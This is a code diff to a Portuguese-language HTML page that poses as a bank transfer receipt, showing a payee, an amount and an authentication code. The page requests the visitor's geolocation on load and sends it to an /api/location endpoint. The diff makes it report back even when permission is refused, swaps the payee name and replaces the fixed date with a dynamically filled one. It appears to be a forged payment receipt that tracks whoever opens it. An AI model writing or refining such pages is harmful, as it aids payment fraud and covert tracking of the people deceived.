@@ -12,6 +12,7 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
+                        // Usuário permitiu localização
                         fetch("/api/location", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
@@ -21,15 +22,27 @@
                             })
                         }).then(() => console.log("Localização enviada"));
                     },
-                    (error) => console.error("Erro ao obter localização:", error)
+                    (error) => {
+                        console.error("Erro ao obter localização:", error);
+                        // Se o usuário negar a permissão, ainda assim enviaremos a mensagem
+                        fetch("/api/location", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                latitude: null,
+                                longitude: null
+                            })
+                        }).then(() => console.log("Usuário recusou compartilhar localização"));
+                    }
                 );
             } else {
                 console.error("Geolocalização não suportada");
             }
         }
-        
+    
         window.onload = solicitarLocalizacao;
     </script>
+
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -83,10 +96,10 @@
         <div class="info"><strong>Agência:</strong>0001</div>
         <div class="info"><strong>Conta:</strong> 56789-0</div>
         <div class="linha"></div>
-        <div class="info"><strong>Favorecido:</strong> João da Silva</div>
+        <div class="info"><strong>Favorecido:</strong> João Manoel Gomes</div>
         <div class="valor">R$ 1.150,00</div>
         <div class="linha"></div>
-        <div class="info data">Data: 26/03/2025 - 14:35</div>
+        <div class="info data" id="data-hora">Data: carregando...</div>
         <div class="info data">Autenticação: 9F3D-7A1C-2B8D</div>
     </div>
 </body>
